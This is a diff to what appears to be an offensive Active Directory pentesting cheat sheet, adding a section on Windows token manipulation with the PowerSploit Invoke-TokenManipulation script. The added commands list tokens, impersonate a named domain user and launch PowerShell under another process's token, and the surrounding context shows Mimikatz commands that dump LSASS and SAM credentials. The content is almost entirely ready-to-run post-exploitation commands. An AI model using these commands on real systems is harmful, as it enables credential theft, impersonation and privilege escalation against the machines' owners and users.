@@ -5,6 +5,7 @@
 * [DC-Sync](#DC-Sync)
 * [Offensive .NET](#Offensive-.NET)
 * [Mimikatz](#Mimikatz) 
+* [Token manipulation](#Token manipulation)
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 
 ## General
@@ -166,6 +167,29 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 #### Mimikatz dump lsass
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+## Token manipulation
+- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
+
+#### List all tokens on a machine
+```
+Invoke-TokenManipulation –ShowAll
+```
+
+#### List all unique, usable tokens on the machine
+```
+Invoke-TokenManipulation -Enumerate
+```
+
+#### Start a new process with token of a specific user
+```
+Invoke-TokenManipulation -ImpersonateUser -Username “domain\user"
+```
+
+#### Start news process with token of another process
+```
+Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
 ```
 
 ## Check Local Admin Access
